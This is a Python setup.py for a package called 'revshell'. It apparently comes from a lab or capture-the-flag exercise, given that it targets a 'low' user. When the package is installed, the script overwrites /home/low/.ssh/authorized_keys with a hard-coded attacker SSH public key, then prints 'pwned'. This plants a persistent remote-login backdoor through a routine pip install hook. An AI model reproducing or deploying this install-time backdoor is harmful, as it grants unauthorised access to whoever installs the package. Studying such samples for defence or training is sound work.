from setuptools import setup

try:
	print ('pwned')
	with open ('/home/low/.ssh/authorized_keys','w+') as f:
		f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWrZzNhUQceBK79znIspILWpDNlbEWJ8vqK2l+746ugvFt861/TZwlaTDhAiWr1J+aHiSVUTa68lgl2s47KYmPBJSfcPOm6pyFcELKedDbAds9b308V/5Fz5w10kBDoshroZbam/NtYm6sY9etkclDyg9tBivoNHaGUAmTnB+cF4Cx0H2p1hWWdCcpJ9L3E5hqbtbtdX222eEC4JQTpqHeFBTSKiYg5V3nTdGp5MfhiIaFcWf79WZv2AzFczmhWUtDeghiG8TmNNam2k0Lh6fD97SQ3HyymNATWlts07KzAbvzPlu2YkM/xoN1ucet9aLzoqnhsPMTXr3obx9+/n54GMO5cDvzHYHObXhBxs5Nb2gz0+ry8DUmwjGHNgiF+ILWILR2wPAAHyogEbhPo0MndMAS075XIB0P2wPqMSHinBcFpaS+X0UdOf5R/J98XfSkBLVZi9IeTLwryaT9suhknrimdyy/nRrNTjNA2qObVHPe7pTVmdYEQJca5IbqBf8=')

except:
	setup(
	name='revshell',
	packages=['revshell'],
	description='Hello You Have Been Pwned',
	version='0.1',
	url='http://hello_world.com',
	author='1nj3ct10n',
	author_email='hello@hello.com',
	keywords=['pip','revshell','example']
	)
